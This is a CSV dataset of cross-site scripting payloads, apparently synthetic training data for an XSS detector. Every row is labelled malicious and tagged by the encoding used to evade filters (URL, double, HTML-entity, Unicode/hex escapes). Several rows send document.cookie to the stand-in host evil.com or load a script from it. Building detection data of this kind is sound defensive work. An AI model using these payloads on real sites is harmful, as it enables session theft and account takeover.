Sentence,Label,Category,Source
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Csvg%20onload%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Ciframe%20src%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Ca%20href%3Djavascript%3Aalert(1)%3EClick%3C%2Fa%3E,1,url_encoded,synthetic_harshit_2025
%3Cbody%20onload%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E,1,url_encoded,synthetic_harshit_2025
%3Cdetails%20open%20ontoggle%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cmarquee%20onstart%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cvideo%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Caudio%20src%3Dx%20onerror%3Dalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cobject%20data%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cembed%20src%3Djavascript%3Aalert(1)%3E,1,url_encoded,synthetic_harshit_2025
%3Cscript%3Efetch%28%27https%3A%2F%2Fevil.com%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%3Cscript%3Ewindow.location%3D%27https%3A%2F%2Fevil.com%2F%27%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%3Cscript%20src%3D%2F%2Fevil.com%2Fxss.js%3E%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%253Cscript%253Ealert%281%29%253C%252Fscript%253E,1,url_encoded,synthetic_harshit_2025
%3CScript%3Ealert%281%29%3C%2FScript%3E,1,url_encoded,synthetic_harshit_2025
%3Cscript%3Enew+Image().src%3D%22//evil.com/%3Fc%3D%22%2Bdocument.cookie%3C%2Fscript%3E,1,url_encoded,synthetic_harshit_2025
%2525253Cscript%2525253Ealert%25281%2529%2525253C%252Fscript%2525253E,1,double_encoded,synthetic_harshit_2025
%25253Cscript%25253Ealert%25281%2529%25253C%25252Fscript%25253E,1,double_encoded,synthetic_harshit_2025
%2526lt%253Bscript%2526gt%253Balert%25281%2529%2526lt%253B%252Fscript%2526gt%253B,1,double_encoded,synthetic_harshit_2025
%253Csvg%2520onload%253Dalert%25281%2529%253E,1,double_encoded,synthetic_harshit_2025
%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E,1,double_encoded,synthetic_harshit_2025
%25253Ciframe%25253E,1,double_encoded,synthetic_harshit_2025
%252525253Cscript%252525253Ealert%28document.domain%29%252525253C%25252Fscript%252525253E,1,double_encoded,synthetic_harshit_2025
&#60;script&#62;alert(1)&#60;/script&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
&lt;script&gt;alert(1)&lt;/script&gt;,1,html_entity_encoded,synthetic_harshit_2025
&#60;img src=x onerror=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#x3C;svg onload=alert(1)&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
&#60;a href=javascript:alert(1)&#62;Click&#60;/a&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;body onload=alert(document.cookie)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(1)&#x3C;/&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;,1,html_entity_encoded,synthetic_harshit_2025
&lt;script&gt;document.write(document.cookie)&lt;/script&gt;,1,html_entity_encoded,synthetic_harshit_2025
&#60;iframe src=javascript:alert(1)&#62;&#60;/iframe&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;input autofocus onfocus=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;details open ontoggle=alert(1)&#62;&#60;/details&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;video src=x onerror=alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;math href=javascript:alert(1)&#62;click&#60;/math&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;,1,html_entity_encoded,synthetic_harshit_2025
"&#60;script&#62;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&#60;/script&#62;",1,html_entity_encoded,synthetic_harshit_2025
&#60;svg&#62;&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;&#60;/svg&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;object data=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;embed src=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
&#60;link rel=stylesheet href=javascript:alert(1)&#62;,1,html_entity_encoded,synthetic_harshit_2025
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
<script>\u0061\u006c\u0065\u0072\u0074(\u0031)</script>,1,unicode_hex_escape,synthetic_harshit_2025
\u003Cscript\u003Ealert(1)\u003C/script\u003E,1,unicode_hex_escape,synthetic_harshit_2025
\u003cimg src=x onerror=alert(1)\u003e,1,unicode_hex_escape,synthetic_harshit_2025
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>,1,unicode_hex_escape,synthetic_harshit_2025
<script>\x61\x6c\x65\x72\x74(1)</script>,1,unicode_hex_escape,synthetic_harshit_2025
\x3cscript\x3ealert(1)\x3c/script\x3e,1,unicode_hex_escape,synthetic_harshit_2025
<script>\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065</script>,1,unicode_hex_escape,synthetic_harshit_2025
"<a href=""javascript:\u0061\u006c\u0065\u0072\u0074(1)"">click</a>",1,unicode_hex_escape,synthetic_harshit_2025
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>,1,unicode_hex_escape,synthetic_harshit_2025
<body onload=\u0061\u006c\u0065\u0072\u0074(document.cookie)>,1,unicode_hex_escape,synthetic_harshit_2025
java\u0073cript:alert(1),1,unicode_hex_escape,synthetic_harshit_2025
